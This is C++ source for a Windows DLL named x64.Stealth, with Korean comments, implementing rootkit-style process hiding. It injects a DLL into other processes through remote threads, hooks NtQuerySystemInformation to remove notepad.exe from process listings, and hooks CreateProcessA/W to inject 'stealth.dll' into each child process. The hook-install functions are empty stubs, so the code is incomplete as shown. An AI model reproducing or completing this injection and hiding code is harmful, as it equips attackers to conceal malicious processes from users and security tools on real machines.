// x64.Stealth.cpp : DLL 응용 프로그램을 위해 내보낸 함수를 정의합니다.
//

#include "stdafx.h"



BOOL enable_code_hooking(LPCTSTR szDllName, LPCSTR szFuncName, PROC pfnNew)
{
	
}

BOOL disable_code_hooking(LPCTSTR szDllName, LPCSTR szFuncName)
{
	
}

BOOL Inject(HANDLE hProc, LPCSTR szDllName)
{
	//TCHAR szProcessName[MAX_PATH];
	//if (GetModuleFileNameExW(hProc, NULL, szProcessName, MAX_PATH) == 0)
	//{
	//	errorLOG("GetModuleFileNameExW()");
	//	return FALSE;
	//}
	//wprintf(TEXT("path : %s\n"), szProcessName);

	PCHAR pRemoteBuf = NULL;
	DWORD dwBufSize = (DWORD)strlen(szDllName) + 1;
	pRemoteBuf = (PCHAR)VirtualAllocEx(hProc, NULL, dwBufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pRemoteBuf == NULL)
		return FALSE;

	SIZE_T cbWritten = 0;
	if (WriteProcessMemory(hProc, pRemoteBuf, szDllName, strlen(szDllName), &cbWritten) == FALSE)
		return FALSE;

	HMODULE kernel32_handle = GetModuleHandleW(TEXT("kernel32.dll"));
	LPTHREAD_START_ROUTINE load_library_ptr;
	load_library_ptr = (LPTHREAD_START_ROUTINE)GetProcAddress(kernel32_handle, "LoadLibraryA");
	if (load_library_ptr == NULL)
		return FALSE;

	HANDLE remote_thread;
	remote_thread = CreateRemoteThreadEx(hProc, NULL, 0, load_library_ptr, pRemoteBuf, NULL, NULL, NULL);
	if (remote_thread == NULL)
		return FALSE;

	if (WaitForSingleObject(remote_thread, INFINITE) == WAIT_FAILED)
		return FALSE;

	if (!VirtualFreeEx(hProc, pRemoteBuf, dwBufSize, MEM_DECOMMIT))
		return FALSE;

	if (!CloseHandle(hProc))
		return FALSE;

	return TRUE;

}


NTSTATUS NTAPI MyNtQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength OPTIONAL
	)
{
	NTSTATUS status;
	FARPROC pFunc;
	PSYSTEM_PROCESS_INFORMATION pCur, pPrev;

	disable_code_hooking(TEXT("ntdll.dll"), "NtQuerySystemInformation");
	pFunc = GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtQuerySystemInformation");
	if (pFunc == NULL)
		return FALSE;

	status = ((PFNTQUERYSYSTEMINFORMATION)pFunc)(
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength
		);

	if (status != 0x00000000L)	{}
	else if (SystemInformationClass == SystemProcessInformation)
	{
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		pPrev = pCur;

		while (TRUE)
		{
			if (!_wcsicmp((PWSTR)pCur->Reserved2[1], TEXT("notepad.exe")))
			{
				if (pCur->NextEntryOffset == 0)
					pPrev->NextEntryOffset = 0;
				else
					pPrev->NextEntryOffset += pCur->NextEntryOffset;
			}
			else
				pPrev = pCur;

			if (pCur->NextEntryOffset == 0)
				break;

			pCur = (PSYSTEM_PROCESS_INFORMATION)((ULONG)pCur + pCur->NextEntryOffset);
		}
	}

	enable_code_hooking(TEXT("ntdll.dll"), "NtQuerySystemInformation", (PROC)MyNtQuerySystemInformation);

	return status;
}

BOOL WINAPI MyCreateProcessA(
	LPCSTR lpApplicationName,
	LPSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCSTR lpCurrentDirectory,
	LPSTARTUPINFOA lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	)
{
	BOOL bRetuen;
	FARPROC pFunc;

	disable_code_hooking(TEXT("kernel32.dll"), "CreateProcessA");

	pFunc = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "CreateProcessA");
	if (pFunc == NULL)
		return FALSE;

	bRetuen = ((PFCREATEPROCESSA)pFunc)(
		lpApplicationName,
		lpCommandLine,
		lpProcessAttributes,
		lpThreadAttributes,
		bInheritHandles,
		dwCreationFlags,
		lpEnvironment,
		lpCurrentDirectory,
		lpStartupInfo,
		lpProcessInformation
		);

	/* dll이름 절대경로로 바꿔주기 */
	if (bRetuen)
		Inject(lpProcessInformation->hProcess, "stealth.dll");

	enable_code_hooking(TEXT("kernel32.dll"), "CreateProcessA", (PROC)MyCreateProcessA);

	return bRetuen;
}

BOOL WINAPI MyCreateProcessW(
	LPCTSTR lpApplicationName,
	LPTSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCTSTR lpCurrentDirectory,
	LPSTARTUPINFO lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	)
{
	BOOL bRetuen;
	FARPROC pFunc;

	disable_code_hooking(TEXT("kernel32.dll"), "CreateProcessW");

	pFunc = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "CreateProcessW");
	if (pFunc == NULL)
		return FALSE;

	bRetuen = ((PFCREATEPROCESSW)pFunc)(
		lpApplicationName,
		lpCommandLine,
		lpProcessAttributes,
		lpThreadAttributes,
		bInheritHandles,
		dwCreationFlags,
		lpEnvironment,
		lpCurrentDirectory,
		lpStartupInfo,
		lpProcessInformation
		);

	/* dll이름 절대경로로 바꿔주기 */
	if (bRetuen)
		Inject(lpProcessInformation->hProcess, "stealth.dll");

	enable_code_hooking(TEXT("kernel32.dll"), "CreateProcessW", (PROC)MyCreateProcessW);

	return bRetuen;
}
